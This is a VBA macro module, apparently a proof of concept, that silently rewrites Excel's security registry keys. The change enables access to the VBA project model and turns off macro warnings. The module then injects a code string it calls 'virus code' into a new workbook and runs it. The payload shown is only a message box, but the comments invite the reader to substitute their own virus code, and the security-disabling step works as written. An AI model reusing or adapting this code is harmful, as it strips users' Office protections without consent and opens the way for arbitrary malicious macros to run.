Attribute VB_Name = "TrustMe"
Sub TrustMe()
    'Create an application variable
    Dim insecureApplication As Application
    'Set trust centre settings
    Call AllowTrustChangeWithoutPrompt
    'Create the insecure application
    Set insecureApplication = New Application
    'Write the virus in the insecure application
    Call writeCode(insecureApplication)
    
End Sub

Private Sub AllowTrustChangeWithoutPrompt()
    
    'Declare Variables
    Dim x As String
    Dim myWs As Object
    Dim strAccessVBOM As String
    Dim strVBAWarnings As String
    
    'Create scripting object
    Set myWs = CreateObject("WScript.Shell")
    
    'Base Excel security uri
    regExcelKey = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & Application.Version & "\Excel\Security\"
    
    strAccessVBOM = "AccessVBOM" 'Extensibility
    strVBAWarnings = "VBAWarnings" 'Macro Warnings
    
    myWs.RegWrite regExcelKey & strAccessVBOM, 1, "REG_DWORD" 'Enables trust to extensibility model
    myWs.RegWrite regExcelKey & strVBAWarnings, 1, "REG_DWORD" 'Allows all macros to execute without warning
    
    
End Sub



    Private Sub writeCode(insecureApplication As Application)
    'Going to set vbProj
    Dim vbProj As Object
    Dim vbComp As Object
    Dim virusCode As String
    Dim virusCodeSubName As String
    
    
    insecureApplication.Workbooks.Add
    Set vbProj = insecureApplication.Workbooks(1).vbProject
    Set vbComp = vbProj.vbComponents.Add(1)  'Adds a standard module
    vbComp.Name = "NefariousModule"
    
    'You can manually add the virus code in this string.
    virusCodeSubName = "potentiallyDangerous"
    
    'This is where you can input code using the VBA project model
    virusCode = "Sub " & virusCodeSubName & "()" & vbCrLf & _
                "MsgBox " & Chr(34) & "Trust Me!" & Chr(34) & _
                vbCrLf & "End Sub"
                
    'Add virusCode string to the new module
    vbComp.CodeModule.AddFromString virusCode
    'Runs the code
    insecureApplication.Run virusCodeSubName
    
End Sub
